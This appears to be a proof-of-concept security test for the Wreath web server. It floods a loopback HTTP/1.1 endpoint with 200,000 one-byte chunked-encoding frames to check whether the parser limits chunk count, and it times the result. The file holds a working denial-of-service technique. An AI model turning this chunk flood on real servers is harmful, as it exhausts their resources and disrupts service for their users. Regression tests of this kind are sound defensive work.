"""PoC: amplify HTTP/1 body work with a flood of one-byte chunks.

Run from the repository root::

    uv run python tests/security/poc_http1_chunk_frame_flood.py

The script binds only to loopback and drives equal-size request bodies through
Wreath's metal event loop and native HTTP/1 parser.  A vulnerable build bounds
payload bytes but not chunk frames, accepting hundreds of thousands of tiny
chunks and doing disproportionate parser and ASGI receive work.
"""

from __future__ import annotations

import asyncio
import socket
import threading
from time import perf_counter

from wreath import Wreath
from wreath.reactor import metal_event_loop
from wreath.server import Server, ServerConfig

PAYLOAD_BYTES = 200_000


def _request(fragmented: bool) -> bytes:
    if fragmented:
        body = b"1\r\nx\r\n" * PAYLOAD_BYTES
    else:
        body = f"{PAYLOAD_BYTES:x}\r\n".encode() + b"x" * PAYLOAD_BYTES + b"\r\n"
    return (
        b"POST /upload HTTP/1.1\r\n"
        b"Host: 127.0.0.1\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
        + body
        + b"0\r\n\r\n"
    )


def _exchange(
    port: int,
    request: bytes,
    output: list[tuple[bytes, float]],
    loop: asyncio.AbstractEventLoop,
    finished: asyncio.Event,
) -> None:
    started = perf_counter()
    response = bytearray()
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=10) as client:
            try:
                client.sendall(request)
                while part := client.recv(4096):
                    response += part
            except OSError:
                # A fixed server may reset while the client still has flood
                # bytes in flight. Any response bytes already read still show
                # whether it rejected or accepted the request.
                pass
    finally:
        output.append((bytes(response), perf_counter() - started))
        loop.call_soon_threadsafe(finished.set)


async def _drive(server: Server, port: int) -> list[tuple[bytes, float]]:
    output: list[tuple[bytes, float]] = []
    loop = asyncio.get_running_loop()
    for fragmented in (False, True):
        finished = asyncio.Event()
        thread = threading.Thread(
            target=_exchange,
            args=(port, _request(fragmented), output, loop, finished),
        )
        thread.start()
        await finished.wait()
        thread.join()
    await server.close()
    return output


def main() -> int:
    seen: list[int] = []
    app = Wreath()

    @app.post("/upload")
    async def upload(request) -> str:
        body = await request.body()
        seen.append(len(body))
        return str(len(body))

    loop = metal_event_loop(gc_mode="stock")
    try:
        config = ServerConfig(
            host="127.0.0.1",
            port=0,
            protocols=("http/1.1",),
            lifespan="off",
        )
        server = Server(app, config, loop)
        loop.run_until_complete(server._start(ssl=None, tls=None))
        port = server.sockets[0].getsockname()[1]
        results = loop.run_until_complete(_drive(server, port))
    finally:
        loop.close()

    statuses = [response.partition(b"\r\n")[0] for response, _ in results]
    bulk_time, flood_time = (elapsed for _response, elapsed in results)
    ratio = flood_time / bulk_time if bulk_time else float("inf")
    vulnerable = statuses == [b"HTTP/1.1 200 OK", b"HTTP/1.1 200 OK"] and seen == [
        PAYLOAD_BYTES,
        PAYLOAD_BYTES,
    ]
    print(f"payload: {PAYLOAD_BYTES:,} bytes")
    print(f"bulk: {bulk_time:.4f}s; one-byte chunks: {flood_time:.4f}s ({ratio:.1f}x)")
    print("VULNERABLE: chunk count is unbounded" if vulnerable else "not vulnerable")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(main())
